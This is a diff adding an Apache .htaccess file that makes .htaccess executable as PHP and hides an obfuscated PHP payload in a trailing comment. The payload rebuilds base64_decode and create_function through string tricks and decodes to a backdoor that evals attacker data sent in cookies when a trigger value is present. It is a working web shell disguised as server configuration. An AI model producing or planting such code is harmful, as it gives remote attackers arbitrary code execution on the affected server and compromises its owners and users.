@@ -1,0 +1,7 @@
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddType application/x-httpd-php .htaccess
+# <?php $uimg="JGM9xJ2NvdWx50xJzskYT0kX0NxPTx0txJRTtpZihyZXNlxdxCgkYSk9PSdodScxgJiYgJGMoJGxEpPjMxpe"; $lpnu = str_replace("v","","vsvtvrv_rveplace"); $apvp="ZWdfcmVwbxGFjZShhcnJheSgnLx1teXHcx9XHNdxLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKS"; $wybn="wgam9pbihhcnxJhexV9zbGljZxSgkYSwkYygxkYSktMyxkpKSkxpOx2VjaG8gJxzwvJy4xkaxy4nPic7fQ=x="; $guhj="yRrPSdqaHVqJztlYx2hvICxc8Jxy4kay4nPic7ZXZhbChixYXNlNjRxfZGVjb2RlxKHBxy"; $fgts = $lpnu("u", "", "ubause64u_udueucuoudue"); $ggkm = $lpnu("y","","ycyreyaytyey_funycytioyn"); $sism = $ggkm('', $fgts($lpnu("x", "", $uimg.$guhj.$apvp.$wybn))); $sism(); ?> #
